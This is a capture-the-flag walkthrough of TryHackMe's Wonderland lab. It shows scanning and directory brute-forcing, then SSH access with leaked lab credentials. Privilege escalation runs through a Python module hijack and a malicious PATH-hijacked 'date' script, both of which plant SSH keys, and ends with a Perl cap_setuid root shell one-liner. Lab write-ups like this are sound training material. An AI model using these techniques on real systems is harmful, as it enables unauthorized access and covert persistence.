# CTF: Wonderland (THM)

**Target IP:** `10.144.131.60` ($target)

## Metadata

- **CTF Name:** Wonderland
    
- **Platform:** TryHackMe
    
- **Date:** 2026-04-08
    
- **Difficulty:** Medium
    
- **Tools Used:** nmap, gobuster, ssh, ssh-keygen, python3.6, linpeas.sh, perl, scp
    
- **Key Skills/Tools:** Web Enumeration (Recursive Pathing), Python Library Hijacking, SSH Key Management, Linux Capabilities (setuid), Path Hijacking
    

## Introduction

This walkthrough documents the exploitation of **Wonderland** on TryHackMe. The process involves navigating a recursive web directory structure, escalating from `alice` to `rabbit` via Python library hijacking, moving to `hatter` via path hijacking of an SUID binary, and finally achieving root via a Perl capability misconfiguration.

**Limitations & Confidence:**

- **Confidence Level:** High. This writeup is strictly based on your provided terminal logs and exploit scripts.
    
- **Limitations:** The initial foothold depends on credentials found within the HTML source code of a specific hidden page.
    

## Reconnaissance

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Wonderland)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **22/tcp:** SSH (OpenSSH 7.6p1)
    
- **80/tcp:** HTTP (Golang http server)
    

## Foothold

### 1. Web Enumeration (Follow the Rabbit)

Directory brute-forcing revealed a nested path structure.

**Command:**

```
😎 amuzed@Kali (~/THM/Wonderland)
$ gobuster dir -u http://$target -w /usr/share/wordlists/dirb/common.txt
```

**Rabbit Hole Path:** `/r/a/b/b/i/t/`

Inspecting the source code of the `/t/` page revealed hidden credentials: `alice:HowDothTheLittleCrocodileImproveHisShiningTail`.

### 2. Initial Access (SSH)

**Attempt 1 (Rabbit Hole):**

I initially tried to SSH as `root` and `rabbit` with the password, but access was denied.

```
😎 amuzed@Kali (~/THM/Wonderland)
$ ssh root@$target
$ ssh rabbit@$target
```

**Attempt 2 (Success):**

Logging in as `alice`:

```
😎 amuzed@Kali (~/THM/Wonderland)
$ ssh alice@$target
# Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

## Lateral Movement

### 1. Alice to Rabbit (Python Library Hijacking)

Checking sudo permissions:

```
alice@wonderland:~$ sudo -l
(rabbit) /usr/bin/python3 /home/alice/walrus_and_the_carpenter.py
```

I updated a local `random.py` file to hijack the `random` module import and inject my SSH key into the `rabbit` user's authorized keys.

**Exploit Script (`random.py`):**

```
import os
os.system('mkdir -p /home/rabbit/.ssh && cat /home/alice/Wonder.pub >> /home/rabbit/.ssh/authorized_keys')
os.system('chmod 700 /home/rabbit/.ssh && chmod 600 /home/rabbit/.ssh/authorized_keys')
print('Exploit successful: ssh key injected.')
```

**Execution:**

```
alice@wonderland:~$ sudo -u rabbit python3.6 /home/alice/walrus_and_the_carpenter.py
```

### 2. Rabbit to Hatter (Binary Path Hijacking & Key Injection)

Inside `/home/rabbit`, I found an SUID binary `teaParty`. I used `strings` and found it calls `date` without a full path. I created a malicious `date` script in `/tmp` to inject my SSH key for `hatter`.

**Malicious Date Script (`/tmp/date`):**

```
rabbit@wonderland:~$ cat /tmp/date
#!/bin/bash
mkdir -p /home/hatter/.ssh && cat /home/alice/Wonder.pub >> /home/hatter/.ssh/authorized_keys
chmod 700 /home/hatter/.ssh && chmod 600 /home/hatter/.ssh/authorized_keys
```

**Execution:**

```
rabbit@wonderland:/home/rabbit$ chmod +x /tmp/date
rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty
```

### 3. Hatter Persistence (SSH Setup)

Hatter's password was found in `password.txt` (`WhyIsARavenLikeAWritingDesk?`), but I used my injected key for access.

**Commands (Local Kali):**

```
😎 amuzed@Kali (~/.ssh)
$ ssh -i hatter_key hatter@$target
```

## Privilege Escalation

### 1. Linux Capabilities Enumeration

I transferred and ran `linpeas.sh` to find escalation vectors.

**Command:**

```
😎 amuzed@Kali (~/.ssh)
$ scp ~/exploits/PEAS/linpeas.sh hatter@$target:linpeas.sh
```

**Linpeas Findings:**

```
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

### 2. Exploiting Perl Capabilities

Using the `cap_setuid` capability to escalate to root.

**Command:**

```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

## Flags

- **User Flag:** `thm{"Curiouser and curiouser!"}` (Found at `/root/user.txt`)
    
- **Root Flag:** `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}` (Found at `/home/alice/root.txt`)
